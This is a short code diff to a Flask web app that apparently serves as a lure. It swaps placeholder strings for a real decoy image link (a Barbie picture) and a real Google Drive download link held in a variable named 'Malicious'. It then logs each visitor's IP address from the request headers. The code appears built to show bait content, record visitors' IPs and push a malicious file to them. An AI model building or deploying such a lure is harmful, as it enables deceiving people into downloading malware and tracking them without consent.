@@ -7,8 +7,8 @@ __name__,
 )
 @app.route('/', methods=['GET'])
 def main():
-  Image = 'YourImageLink' # Replace this with your image link
-  Malicious = 'MaliciousFIleDownloadLink'# Replace this with your download link
+  Image = 'https://www.google.com/imgres?imgurl=https%3A%2F%2Falijuguetes.es%2Fblog%2Fwp-content%2Fuploads%2F2020%2F03%2Fbarbie.jpg&imgrefurl=https%3A%2F%2Falijuguetes.es%2Fblog%2Fmuneca-barbie-2%2F&tbnid=8VYQ-mMTW1XY6M&vet=12ahUKEwjzx8maqJX2AhVRw4UKHTznAPgQMygFegUIARDGAQ..i&docid=lsSptOempRl8zM&w=1280&h=720&q=barbie&safe=active&ved=2ahUKEwjzx8maqJX2AhVRw4UKHTznAPgQMygFegUIARDGAQ' # Replace this with your image link
+  Malicious = 'https://drive.google.com/uc?export=download&id=1-mXBXfO-NjhC0h7It_YbBDLiMRxTaLtt'# Replace this with your download link
   # This is to get the ip
   if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
     ip = request.environ['REMOTE_ADDR']
